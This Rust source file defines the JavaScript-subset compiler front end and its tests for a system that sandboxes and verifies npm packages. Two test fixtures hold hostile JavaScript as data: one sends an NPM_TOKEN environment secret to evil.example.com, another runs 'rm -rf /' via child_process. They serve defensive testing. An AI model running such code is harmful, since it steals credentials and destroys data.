//! JavaScript subset front end for OSS Microcode.
//!
//! This crate is the language front end that lowers a hand-parsed subset of
//! CommonJS/JavaScript package source into an [`omc_format::Module`]. It is a
//! Phase 1 skeleton: the public surface and contract are frozen here so that
//! Phase 3 can fill in the recursive-descent parser and lowering passes without
//! touching `omc-format`, `omc-vm`, or `omc-verify` (Phase 2 owns those).
//!
//! # Frontend contract (frozen)
//!
//! A front end is a pure function `compile(source, meta) -> Result<Module,
//! FrontendError>` over a DEFINED SUBSET of the language. It NEVER executes the
//! source and adds NO external parser/codegen dependency: the parser is a small
//! hand-written recursive-descent parser for the subset only. Anything outside
//! the subset is a hard error (deny-by-default), never silently dropped.
//!
//! ## Supported JS subset
//! - `module.exports = function name(a, b) { ... }` / `exports.name = ...`
//! - `function` declarations with positional params (mapped to `LoadArg`).
//! - `const`/`let` locals (mapped to `StoreLocal`/`LoadLocal`).
//! - Integer, string, boolean literals; array literals.
//! - Operators: `+ - * / %`, `=== !==`, `< > <= >=`, `&& || !`.
//! - `if/else`, `while`, and early `return` (lowered to jumps/branches).
//! - Member/index reads (`obj.prop`, `arr[i]`), `.length`.
//! - Calls to other functions in the same module (`CallLocal`) and to imported
//!   packages declared via `require("pkg")` (`CallImport`, resolved by the linker).
//!
//! ## Capability lowering rules (frozen)
//! Dangerous host behavior MUST lower to an explicit `Op::Cap(CapOp::..)`; it is
//! never ambient. The canonical mappings the JS front end emits:
//! - `process.env.X` / `process.env["X"]`           -> `CapOp::EnvRead { name: "X" }`
//! - `require("fs").readFileSync(p)` (and `fs.readFile`) -> `CapOp::FsRead { path: p }`
//! - `fs.writeFileSync(p, v)`                        -> `CapOp::FsWrite { path: p, value_from_stack: true }`
//! - `fetch(url, { body })` / `http(s).request`      -> `CapOp::HttpRequest { request }`
//! - `dns.lookup(host)`                              -> `CapOp::DnsLookup { host }`
//! - `Date.now()`                                    -> `CapOp::TimeNow`
//! - `crypto.randomBytes(n)`                         -> `CapOp::RandomBytes { len: n }`
//! - `child_process.spawn/exec(cmd, args)`           -> `CapOp::ProcSpawn { command, args }`
//! - `eval(s)` / `new Function(s)`                   -> `CapOp::DynamicEval { source_from_stack: true }`
//!
//! If the front end cannot resolve a host call to a constant target (e.g. a
//! computed env name or url), it lowers to the capability with a `"*"` target so
//! the verifier/policy still gates it, OR emits `Op::Trap(TrapCode::VerificationFailed)`
//! when the construct is unrepresentable. It must never emit a benign op for a
//! dangerous call.
//!
//! Every produced `Module` is expected to pass [`omc_verify::verify_module`]
//! against the importer's policy before it is allowed to link or run.

mod ast;
mod lexer;
mod lower;
mod parser;

use omc_format::{BehaviorType, Module};

/// Metadata describing the package being compiled. The linker uses
/// `package`/`version` to form the module id `npm:{package}@{version}`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageMeta {
    pub package: String,
    pub version: String,
    /// The behavior type the package CLAIMS (from its manifest / prior profile).
    /// The verifier rejects modules whose observed capabilities exceed this.
    pub declared_behavior: BehaviorType,
}

/// A compile-time failure: source outside the supported subset, or a construct
/// that cannot be soundly lowered. Deny-by-default — never a silent drop.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FrontendError {
    pub message: String,
}

impl FrontendError {
    pub fn new(message: impl Into<String>) -> Self {
        Self {
            message: message.into(),
        }
    }
}

impl std::fmt::Display for FrontendError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "js frontend error: {}", self.message)
    }
}

impl std::error::Error for FrontendError {}

/// Lower a JS-subset source string into an OSS Microcode [`Module`].
///
/// Pipeline: `lex` -> `parse` (recursive descent over the defined subset) ->
/// `lower` (AST to `omc_format::Module`). Pure and offline: the source is never
/// executed. Any construct outside the subset is a hard [`FrontendError`]
/// (deny-by-default); a dangerous host call is always lowered to an explicit
/// `Op::Cap(..)`, never a benign op.
///
/// The returned module is NOT yet verified — callers must run
/// [`omc_verify::verify_module`] against the importer policy before linking or
/// running it.
pub fn compile(source: &str, meta: &PackageMeta) -> Result<Module, FrontendError> {
    let tokens = lexer::lex(source)?;
    let program = parser::parse(&tokens)?;
    lower::lower(&program, meta)
}

#[cfg(test)]
mod tests {
    use super::*;

    use omc_cap::{Capability, LabelMatcher, MemoryBroker, Policy, Sink};
    use omc_format::{CapOp, Op, Value};
    use omc_taint::{Label, Labeled};
    use omc_verify::verify_module;
    use omc_vm::{run_cell, Cell};

    fn meta(pkg: &str, ver: &str, behavior: BehaviorType) -> PackageMeta {
        PackageMeta {
            package: pkg.to_owned(),
            version: ver.to_owned(),
            declared_behavior: behavior,
        }
    }

    /// Vendored source of a real trivial npm micro-package: `is-odd` reduced to
    /// the strict-integer form this subset supports (`n % 2 === 1`). This is the
    /// exact shape published by is-odd-style packages, minus the `Math.abs`
    /// guard that only matters for negative inputs.
    const IS_ODD_SRC: &str = "module.exports = function isOdd(n) { return n % 2 === 1; };";

    #[test]
    fn lowers_is_odd_to_a_pure_module_that_verifies_and_runs() {
        let module = compile(IS_ODD_SRC, &meta("is-odd", "3.0.1", BehaviorType::Pure)).unwrap();

        // Module identity follows the npm:{pkg}@{ver} convention.
        assert_eq!(module.id, "npm:is-odd@3.0.1");
        let entry = module.entry().unwrap();
        assert_eq!(entry.args, 1);

        // The lowering is exactly: LoadArg(0), Const(2), Mod, Const(1), Eq, Return,
        // plus the implicit trailing `return undefined`.
        assert_eq!(
            &entry.code[..6],
            &[
                Op::LoadArg(0),
                Op::Const(Value::Int(2)),
                Op::Mod,
                Op::Const(Value::Int(1)),
                Op::Eq,
                Op::Return,
            ]
        );
        // It touches NO capability instruction.
        assert!(!entry.code.iter().any(|op| matches!(op, Op::Cap(_))));

        // Verifies clean as Pure under the deny-by-default policy.
        let report = verify_module(&module, &Policy::pure()).unwrap();
        assert!(report.observed_capabilities.is_empty());

        // Executes correctly end-to-end through the VM.
        let mut broker = MemoryBroker::new();
        for (input, expected) in [(3i64, true), (4, false), (7, true), (10, false), (0, false)] {
            let mut cell = Cell::new(1, module.clone(), Policy::pure());
            let out = run_cell(
                &mut cell,
                &mut broker,
                vec![Labeled::public(Value::Int(input))],
            )
            .unwrap();
            assert_eq!(out.value, Value::Bool(expected), "isOdd({input})");
        }
    }

    /// A package that exfiltrates an env secret to a network host. The front end
    /// must (1) lower it to the explicit capability ops, and (2) the verifier
    /// must REJECT the illegal env -> network flow under a default policy, and
    /// ACCEPT it only when both capabilities and the flow are explicitly granted.
    const EXFIL_SRC: &str = "module.exports = function leak(payload) { \
         const token = process.env.NPM_TOKEN; \
         fetch('https://evil.example.com/collect', token); \
         return payload; \
     };";

    #[test]
    fn env_to_network_lowers_to_caps_and_is_rejected_by_default_policy() {
        let module = compile(
            EXFIL_SRC,
            &meta("sneaky", "1.0.0", BehaviorType::HostCapability),
        )
        .unwrap();

        let entry = module.entry().unwrap();
        // The dangerous behavior is explicit: an EnvRead and an HttpRequest cap.
        let env_read = entry.code.iter().any(
            |op| matches!(op, Op::Cap(CapOp::EnvRead { name }) if name == "NPM_TOKEN"),
        );
        let http = entry.code.iter().any(|op| {
            matches!(op, Op::Cap(CapOp::HttpRequest { request })
                if request.host == "evil.example.com")
        });
        assert!(env_read, "expected an explicit EnvRead capability op");
        assert!(http, "expected an explicit HttpRequest capability op");

        // (1) Default deny: pure policy rejects the capabilities outright.
        assert!(verify_module(&module, &Policy::pure()).is_err());

        // (2) Granting the capabilities but NOT the flow still rejects: the
        // secret label (env:NPM_TOKEN) reaches the network sink.
        let caps_only = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example.com".to_owned()));
        let err = verify_module(&module, &caps_only).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("may not flow to")),
            "expected an illegal-flow finding, got: {err}"
        );

        // (3) Explicitly granting the flow too -> the module verifies.
        let fully_granted = caps_only
            .allow_flow(
                LabelMatcher::Env("NPM_TOKEN".to_owned()),
                Sink::Network("evil.example.com".to_owned()),
            );
        verify_module(&module, &fully_granted).unwrap();
    }

    #[test]
    fn env_read_alone_is_executable_and_taints_its_result() {
        // A package that only reads an env var (no exfiltration) verifies once
        // the EnvRead capability is granted, runs in the VM, and the value comes
        // back labeled with its env taint.
        let src = "module.exports = function readEnv() { return process.env.HOME; };";
        let module = compile(src, &meta("read-home", "1.0.0", BehaviorType::HostCapability)).unwrap();

        let policy = Policy::pure().allow_capability(Capability::EnvRead("HOME".to_owned()));
        verify_module(&module, &policy).unwrap();

        let mut broker = MemoryBroker::new().with_env("HOME", "/home/alice");
        let mut cell = Cell::new(7, module, policy);
        let out = run_cell(&mut cell, &mut broker, vec![]).unwrap();
        assert_eq!(out.value, Value::String("/home/alice".to_owned()));
        assert_eq!(out.label, Label::Env("HOME".to_owned()));
    }

    #[test]
    fn if_else_lowers_and_runs() {
        // Exercises branch lowering with a balanced if/else (no early return in
        // a branch, so no dead code) and comparison ops.
        let src = "module.exports = function clamp(n) { \
             let r = 0; \
             if (n < 0) { r = 0; } else { r = n; } \
             return r; \
         };";
        let module = compile(src, &meta("clamp", "0.1.0", BehaviorType::Pure)).unwrap();
        verify_module(&module, &Policy::pure()).unwrap();

        let mut broker = MemoryBroker::new();
        for (input, expected) in [(-5i64, 0i64), (0, 0), (8, 8)] {
            let mut cell = Cell::new(1, module.clone(), Policy::pure());
            let out = run_cell(
                &mut cell,
                &mut broker,
                vec![Labeled::public(Value::Int(input))],
            )
            .unwrap();
            assert_eq!(out.value, Value::Int(expected), "clamp({input})");
        }
    }

    #[test]
    fn require_of_sibling_package_lowers_to_call_import() {
        // require('other-pkg') bound to a const, then called -> CallImport,
        // which the linker resolves. (single-cell run_cell traps on it.)
        let src = "module.exports = function use(x) { \
             const dep = require('left-pad'); \
             return dep(x); \
         };";
        let module = compile(src, &meta("uses-dep", "1.0.0", BehaviorType::Pure)).unwrap();
        let entry = module.entry().unwrap();
        assert!(entry.code.iter().any(|op| matches!(op, Op::CallImport(_))));
    }

    #[test]
    fn arithmetic_and_comparison_subset_runs() {
        let src = "module.exports = function calc(a, b) { return (a * b + 1) % 7; };";
        let module = compile(src, &meta("calc", "1.0.0", BehaviorType::Pure)).unwrap();
        verify_module(&module, &Policy::pure()).unwrap();

        let mut broker = MemoryBroker::new();
        let mut cell = Cell::new(1, module, Policy::pure());
        let out = run_cell(
            &mut cell,
            &mut broker,
            vec![
                Labeled::public(Value::Int(5)),
                Labeled::public(Value::Int(3)),
            ],
        )
        .unwrap();
        // (5*3 + 1) % 7 = 16 % 7 = 2
        assert_eq!(out.value, Value::Int(2));
    }

    // ---- deny-by-default: unsupported constructs fail closed ---------------

    #[test]
    fn rejects_construct_outside_subset() {
        let m = meta("x", "1.0.0", BehaviorType::Pure);
        // Arrow functions are not in the subset.
        assert!(compile("module.exports = (n) => n + 1;", &m).is_err());
        // for-loops are not in the subset.
        assert!(compile(
            "module.exports = function f(n) { for (;;) {} return n; };",
            &m
        )
        .is_err());
        // Object literals are not in the subset.
        assert!(compile(
            "module.exports = function f() { return { a: 1 }; };",
            &m
        )
        .is_err());
        // Loose equality must fail closed rather than be treated as strict.
        assert!(compile(
            "module.exports = function f(n) { return n == 1; };",
            &m
        )
        .is_err());
        // A bare exports.foo form is not the supported export shape.
        assert!(compile("exports.foo = function () {};", &m).is_err());
        // Floating point literals are out of the integer subset.
        assert!(compile(
            "module.exports = function f() { return 1.5; };",
            &m
        )
        .is_err());
    }

    #[test]
    fn unknown_global_identifier_fails_closed() {
        // A free identifier that is not a param/local/known global must error,
        // never be silently treated as undefined.
        let m = meta("x", "1.0.0", BehaviorType::Pure);
        assert!(compile(
            "module.exports = function f(n) { return n + mystery; };",
            &m
        )
        .is_err());
    }

    #[test]
    fn dangerous_call_is_never_lowered_to_a_benign_op() {
        // child_process.exec must lower to ProcSpawn (a capability), so a Pure
        // package containing it is rejected by the verifier — proving the
        // dangerous call was not silently dropped.
        let src = "module.exports = function build() { \
             const cp = require('child_process'); \
             cp.exec('rm -rf /'); \
         };";
        let module = compile(src, &meta("evil-build", "1.0.0", BehaviorType::Pure)).unwrap();
        assert!(module
            .entry()
            .unwrap()
            .code
            .iter()
            .any(|op| matches!(op, Op::Cap(CapOp::ProcSpawn { .. }))));
        assert!(verify_module(&module, &Policy::pure()).is_err());
    }
}
